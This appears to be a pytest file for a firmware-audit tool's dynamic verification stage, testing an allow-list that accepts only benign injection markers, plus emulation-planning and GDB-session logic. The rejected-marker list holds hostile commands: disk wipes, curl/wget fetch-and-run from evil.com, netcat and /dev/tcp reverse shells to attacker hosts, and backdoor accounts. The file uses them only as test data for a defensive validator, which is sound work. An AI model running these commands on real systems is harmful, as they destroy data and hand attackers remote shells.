"""Tests for `stage5_verification.fvvw.dynamic_track` — Stage 5 FVVW v3
Phase 4. Two groups: (1) the benign-marker-only invariant
(`validate_benign_marker`) — safety-critical, tested most thoroughly; (2)
`plan_emulation`/`dynamic_evaluate`'s pure rule-engine logic, including the
hypothesis A/B switch (FVVW §9). The stateful GDB-session nodes
(`bringup_stabilize`/`reach_target`/`satisfy_guards`/`instrument_trigger`/
`collect_signals`) are exercised via a fake `SandboxExecutor`-shaped
session double, mirroring `tests/conftest.py::FakeExecutor`'s spirit for
the new session methods.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from fw_audit.common.findings import (
    Confidence,
    Decision,
    EvidenceSpan,
    Finding,
    FindingSink,
    FindingSource,
    Severity,
)
from fw_audit.common.verification import DynamicPlan, GuardSpec, TargetMeta, VerificationVerdict
from fw_audit.config.settings import Settings
from fw_audit.executors.base import ExecutionResult, SessionHandle
from fw_audit.stage5_verification.candidate_index import VerificationCandidate
from fw_audit.stage5_verification.fvvw.dynamic_track import (
    BenignMarkerViolation,
    BringupContext,
    BringupExhausted,
    DynamicFault,
    bringup_stabilize,
    collect_signals,
    dynamic_evaluate,
    instrument_trigger,
    plan_emulation,
    reach_target,
    satisfy_guards,
    validate_benign_marker,
)

# ---------------------------------------------------------------------- #
# validate_benign_marker — safety-critical, tested most thoroughly
# ---------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "marker",
    [
        ";touch /tmp/claim_001_proof;",
        "touch /tmp/claim_001_proof",
        "echo claim_001_proof > /tmp/claim_001_proof",
        "mkdir -p /tmp/claim_001_proof",
        ";echo pwned;",  # benign shape, harmless content
    ],
)
def test_benign_markers_pass(marker: str):
    validate_benign_marker(marker)  # must not raise


@pytest.mark.parametrize(
    "marker",
    [
        "; rm -rf / ;",
        "; nc -e /bin/sh attacker.com 4444 ;",
        "; curl http://evil.com/x | sh ;",
        "; wget http://evil.com/payload -O /tmp/p && /tmp/p ;",
        "; dd if=/dev/zero of=/dev/sda ;",
        "; reboot ;",
        "; shutdown -h now ;",
        "; chmod +s /bin/sh ;",
        "; passwd root ;",
        "; useradd backdoor ;",
        "bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'",
        "; echo x >> /etc/passwd ;",
        "; mknod /tmp/backdoor p ;",
        "; iptables -F ;",
        "; echo x | nc attacker.com 4444 ;",
    ],
)
def test_dangerous_markers_rejected(marker: str):
    with pytest.raises(BenignMarkerViolation):
        validate_benign_marker(marker)


def test_empty_marker_rejected():
    with pytest.raises(BenignMarkerViolation):
        validate_benign_marker("")


def test_whitespace_only_marker_rejected():
    with pytest.raises(BenignMarkerViolation):
        validate_benign_marker("   ")


def test_marker_not_matching_allowlist_shape_rejected():
    """Even something that LOOKS harmless but isn't touch/echo/mkdir of a
    scoped path is rejected — the allow-list is deliberately narrow."""
    with pytest.raises(BenignMarkerViolation):
        validate_benign_marker("; some_custom_binary --do-something ;")


# ---------------------------------------------------------------------- #
# plan_emulation
# ---------------------------------------------------------------------- #


def _target(arch: str = "arm", endianness: str = "little") -> TargetMeta:
    return TargetMeta(arch=arch, endianness=endianness, func_offset="0x1000")


def _dynamic_plan(**overrides) -> DynamicPlan:
    defaults = dict(
        reach_strategy="inferior_call",
        payload_marker=";touch /tmp/claim_001_proof;",
        decisive_observable="obs",
    )
    defaults.update(overrides)
    return DynamicPlan(**defaults)


def test_plan_emulation_defaults_to_user_mode():
    result = plan_emulation(_target(), _dynamic_plan())
    assert result["emulation_plan"]["mode"] == "user"
    assert result["emulation_plan"]["arch_spec_key"] == ("arm", "little")


def test_plan_emulation_selects_system_mode_on_kernel_hint():
    plan = _dynamic_plan(guards=[GuardSpec(name="nvram_check", forced_value="1")])
    result = plan_emulation(_target(), plan)
    assert result["emulation_plan"]["mode"] == "system"


def test_plan_emulation_unsupported_arch():
    result = plan_emulation(_target(arch="x86_64", endianness="little"), _dynamic_plan())
    assert result["emulation_plan"]["mode"] == "unsupported"
    assert "no QEMU support" in result["emulation_plan"]["reason"]


# ---------------------------------------------------------------------- #
# dynamic_evaluate — the A/B hypothesis switch
# ---------------------------------------------------------------------- #


def test_dynamic_evaluate_not_reached_retries_before_cap():
    result = dynamic_evaluate(
        reached=False,
        captured_sink_argument=None,
        signals=[],
        plan=_dynamic_plan(),
        active_hypothesis="A",
        iteration=1,
        max_iterations=4,
    )
    assert result["route"] == "retry"


def test_dynamic_evaluate_not_reached_at_cap_is_inconclusive():
    result = dynamic_evaluate(
        reached=False,
        captured_sink_argument=None,
        signals=[],
        plan=_dynamic_plan(),
        active_hypothesis="A",
        iteration=4,
        max_iterations=4,
    )
    assert result["route"] == "done"
    assert result["result"].verdict == VerificationVerdict.INCONCLUSIVE
    assert result["result"].proved_hypothesis == "none"


def test_dynamic_evaluate_confirms_hypothesis_a_with_three_signals():
    signals = [
        {"kind": "sink_argument_capture", "marker_present": True},
        {"kind": "target_self_report", "marker_present": True},
        {"kind": "filesystem_artifact", "marker_present": True},
    ]
    result = dynamic_evaluate(
        reached=True,
        captured_sink_argument=";touch /tmp/claim_001_proof;",
        signals=signals,
        plan=_dynamic_plan(),
        active_hypothesis="A",
        iteration=1,
        max_iterations=4,
    )
    assert result["route"] == "done"
    assert result["result"].verdict == VerificationVerdict.CONFIRMED
    assert result["result"].proved_hypothesis == "A"


def test_dynamic_evaluate_refutes_on_clean_neutralization():
    signals = [
        {"kind": "sink_argument_capture", "marker_present": False},
        {"kind": "target_self_report", "marker_present": False},
    ]
    result = dynamic_evaluate(
        reached=True,
        captured_sink_argument="escaped_and_safe_value",
        signals=signals,
        plan=_dynamic_plan(),
        active_hypothesis="A",
        iteration=1,
        max_iterations=4,
    )
    assert result["route"] == "done"
    assert result["result"].verdict == VerificationVerdict.REFUTED
    assert result["result"].proved_hypothesis == "B"


def test_dynamic_evaluate_switches_hypothesis_when_a_stalls():
    """Reached, but not enough corroborating signals and not cleanly
    neutralized either — a genuine stall. At the iteration cap while still
    testing A, must switch to B rather than terminate."""
    signals = [{"kind": "sink_argument_capture", "marker_present": True}]  # only 1, need 3
    result = dynamic_evaluate(
        reached=True,
        captured_sink_argument="partial",
        signals=signals,
        plan=_dynamic_plan(),
        active_hypothesis="A",
        iteration=4,
        max_iterations=4,
    )
    assert result["route"] == "switch_hypothesis"
    assert result["next_hypothesis"] == "B"


def test_dynamic_evaluate_terminates_inconclusive_when_b_also_stalls():
    signals = [{"kind": "sink_argument_capture", "marker_present": True}]
    result = dynamic_evaluate(
        reached=True,
        captured_sink_argument="partial",
        signals=signals,
        plan=_dynamic_plan(),
        active_hypothesis="B",  # already switched once, still stalling
        iteration=4,
        max_iterations=4,
    )
    assert result["route"] == "done"
    assert result["result"].verdict == VerificationVerdict.INCONCLUSIVE
    assert result["result"].proved_hypothesis == "none"


def test_dynamic_evaluate_retries_mid_budget_when_stalling():
    signals = [{"kind": "sink_argument_capture", "marker_present": True}]
    result = dynamic_evaluate(
        reached=True,
        captured_sink_argument="partial",
        signals=signals,
        plan=_dynamic_plan(),
        active_hypothesis="A",
        iteration=2,
        max_iterations=4,
    )
    assert result["route"] == "retry"


# ---------------------------------------------------------------------- #
# Session-based nodes — fake SandboxExecutor-shaped session double
# ---------------------------------------------------------------------- #


class _FakeSessionExecutor:
    """Duck-typed stand-in for `SandboxExecutor`'s session methods
    (`start`/`exec_in_session`/`stop`) — a test controls `on_exec` the same
    way `tests/conftest.py::FakeExecutor` controls `on_run` for `run()`."""

    def __init__(self, on_exec=None) -> None:
        self.exec_calls: list[str] = []
        self.started = False
        self.stopped = False
        self._on_exec = on_exec

    async def start(self, *, image=None, files=None, network=None):
        self.started = True
        return SessionHandle(container_name="fake-session-abc123", workspace_dir=files)

    async def exec_in_session(self, handle, command, *, timeout=None):
        self.exec_calls.append(command)
        if self._on_exec is not None:
            result = self._on_exec(command)
            if result is not None:
                return result
        return ExecutionResult(command=command, returncode=0, stdout="", stderr="", timed_out=False)

    async def stop(self, handle):
        self.stopped = True


def _finding() -> Finding:
    return Finding(
        finding_id="candidate_001",
        title="t",
        category="command_execution",
        severity=Severity(impact=3, exploitability=3, reachability=3),
        confidence=Confidence.MEDIUM,
        decision=Decision.ESCALATE,
        evidence_span=EvidenceSpan(function_id="f", line_start=1, line_end=2, code="x"),
        source=FindingSource(expression="s", type="NVRAM", attacker_control="UNKNOWN"),
        sink=FindingSink(expression="system(s)", type="COMMAND_EXECUTION"),
        security_condition="c",
        exploitability="e",
        impact="i",
        why_vulnerable="w",
        why_not_false_positive="n",
    )


def _candidate(*, binary_path: Path | None, rootfs_dir: Path | None) -> VerificationCandidate:
    return VerificationCandidate(
        global_id="vulnbin#0000::candidate_001",
        chunk_id="vulnbin#0000",
        bin_id="vulnbin",
        finding=_finding(),
        source_path=None,
        binary_path=binary_path,
        rootfs_dir=rootfs_dir,
    )


def _ctx(tmp_path: Path, *, session_executor, plan=None) -> BringupContext:
    rootfs = tmp_path / "rootfs"
    (rootfs / "bin").mkdir(parents=True, exist_ok=True)
    binary_path = rootfs / "bin" / "vulnbin"
    binary_path.write_bytes(b"\x7fELF")
    return BringupContext(
        candidate=_candidate(binary_path=binary_path, rootfs_dir=rootfs),
        target=_target(),
        plan=plan or _dynamic_plan(entry_addr="0x1000", sink_addr="0x2000"),
        emulation_plan={"mode": "user", "arch_spec_key": ("arm", "little")},
        settings=Settings(_env_file=None),
        session_executor=session_executor,
    )


async def test_bringup_stabilize_starts_session_and_launches_qemu(tmp_path: Path):
    executor = _FakeSessionExecutor()
    ctx = _ctx(tmp_path, session_executor=executor)

    handle = await bringup_stabilize(ctx)

    assert executor.started
    assert handle.container_name == "fake-session-abc123"
    assert any("qemu-arm" in c for c in executor.exec_calls)
    assert "started session" in " ".join(ctx.applied_fixes)


async def test_bringup_stabilize_raises_when_arch_unsupported(tmp_path: Path):
    executor = _FakeSessionExecutor()
    ctx = _ctx(tmp_path, session_executor=executor)
    ctx.emulation_plan = {"mode": "user", "arch_spec_key": ("x86_64", "little")}

    with pytest.raises(BringupExhausted):
        await bringup_stabilize(ctx)


async def test_bringup_stabilize_raises_when_repair_budget_exhausted(tmp_path: Path):
    executor = _FakeSessionExecutor()
    settings = Settings(_env_file=None, FWA_STAGE5_BRINGUP_MAX_REPAIRS=1)
    ctx = _ctx(tmp_path, session_executor=executor)
    ctx.settings = settings
    ctx.repair_count = 1  # already at the cap

    with pytest.raises(BringupExhausted):
        await bringup_stabilize(ctx)


async def test_bringup_stabilize_does_not_grant_network_by_default(tmp_path: Path):
    executor = _FakeSessionExecutor()
    plan = _dynamic_plan(
        entry_addr="0x1000",
        sink_addr="0x2000",
        guards=[GuardSpec(name="socket_bind_check", forced_value="1")],
    )
    ctx = _ctx(tmp_path, session_executor=executor, plan=plan)
    # stage5_allow_network_grant defaults to False

    await bringup_stabilize(ctx)

    assert not any("granted scoped network" in f for f in ctx.applied_fixes)


async def test_bringup_stabilize_grants_network_when_allowed_and_needed(tmp_path: Path):
    executor = _FakeSessionExecutor()
    plan = _dynamic_plan(
        entry_addr="0x1000",
        sink_addr="0x2000",
        guards=[GuardSpec(name="socket_bind_check", forced_value="1")],
    )
    ctx = _ctx(tmp_path, session_executor=executor, plan=plan)
    ctx.settings = Settings(_env_file=None, FWA_STAGE5_ALLOW_NETWORK_GRANT=True)

    await bringup_stabilize(ctx)

    assert any("granted scoped network" in f for f in ctx.applied_fixes)


async def test_reach_target_raises_dynamic_fault_on_connection_refused(tmp_path: Path):
    def on_exec(command):
        if "gdb-multiarch" in command:
            return ExecutionResult(
                command=command,
                returncode=1,
                stdout="",
                stderr="Connection refused",
                timed_out=False,
            )
        return None

    executor = _FakeSessionExecutor(on_exec)
    ctx = _ctx(tmp_path, session_executor=executor)
    ctx.handle = SessionHandle(container_name="c1")

    with pytest.raises(DynamicFault):
        await reach_target(ctx)


async def test_reach_target_succeeds_when_breakpoint_hits(tmp_path: Path):
    def on_exec(command):
        if "gdb-multiarch" in command:
            return ExecutionResult(
                command=command,
                returncode=0,
                stdout="Breakpoint 1, 0x00022594 in main ()\n",
                stderr="",
                timed_out=False,
            )
        return None

    executor = _FakeSessionExecutor(on_exec)
    ctx = _ctx(tmp_path, session_executor=executor)
    ctx.handle = SessionHandle(container_name="c1")

    transcript, reached = await reach_target(ctx)
    assert reached is True
    assert "Breakpoint" in transcript


async def test_satisfy_guards_logs_real_value_and_forces(tmp_path: Path):
    def on_exec(command):
        if "gdb-multiarch" in command:
            return ExecutionResult(
                command=command,
                returncode=0,
                stdout="GUARD:acscli2_acs_restart:real=0\n",
                stderr="",
                timed_out=False,
            )
        return None

    executor = _FakeSessionExecutor(on_exec)
    plan = _dynamic_plan(
        entry_addr="0x1000",
        sink_addr="0x2000",
        guards=[GuardSpec(name="acscli2_acs_restart", addr="0x000276dc", forced_value="1")],
    )
    ctx = _ctx(tmp_path, session_executor=executor, plan=plan)
    ctx.handle = SessionHandle(container_name="c1")

    transcript, guard_logs = await satisfy_guards(ctx)
    assert len(guard_logs) == 1
    assert guard_logs[0]["name"] == "acscli2_acs_restart"
    assert guard_logs[0]["real_value"] == "0"
    assert guard_logs[0]["forced_value"] == "1"


async def test_instrument_trigger_refuses_non_benign_marker(tmp_path: Path):
    executor = _FakeSessionExecutor()
    plan = _dynamic_plan(
        entry_addr="0x1000", sink_addr="0x2000", payload_marker="; rm -rf / ;"
    )
    ctx = _ctx(tmp_path, session_executor=executor, plan=plan)
    ctx.handle = SessionHandle(container_name="c1")

    with pytest.raises(BenignMarkerViolation):
        await instrument_trigger(ctx)

    # Must refuse BEFORE issuing any exec_in_session call.
    assert executor.exec_calls == []


async def test_instrument_trigger_captures_sink_argument(tmp_path: Path):
    def on_exec(command):
        if "gdb-multiarch" in command:
            return ExecutionResult(
                command=command,
                returncode=0,
                stdout="TRIGGER:sink_arg:;touch /tmp/claim_001_proof;\n",
                stderr="",
                timed_out=False,
            )
        return None

    executor = _FakeSessionExecutor(on_exec)
    ctx = _ctx(tmp_path, session_executor=executor)
    ctx.handle = SessionHandle(container_name="c1")

    transcript, captured = await instrument_trigger(ctx)
    assert captured == ";touch /tmp/claim_001_proof;"


async def test_collect_signals_reports_filesystem_artifact_and_self_report(tmp_path: Path):
    def on_exec(command):
        if command.startswith("test -e"):
            return ExecutionResult(
                command=command, returncode=0, stdout="FOUND\n", stderr="", timed_out=False
            )
        if "target_stdout.log" in command:
            return ExecutionResult(
                command=command,
                returncode=0,
                stdout="app: wrote to /tmp/claim_001_proof\n",
                stderr="",
                timed_out=False,
            )
        return None

    executor = _FakeSessionExecutor(on_exec)
    ctx = _ctx(tmp_path, session_executor=executor)
    ctx.handle = SessionHandle(container_name="c1")

    signals = await collect_signals(ctx, captured_sink_argument=";touch /tmp/claim_001_proof;")

    kinds = {s["kind"] for s in signals}
    assert "sink_argument_capture" in kinds
    assert "filesystem_artifact" in kinds
    assert "target_self_report" in kinds
    fs_signal = next(s for s in signals if s["kind"] == "filesystem_artifact")
    assert fs_signal["marker_present"] is True
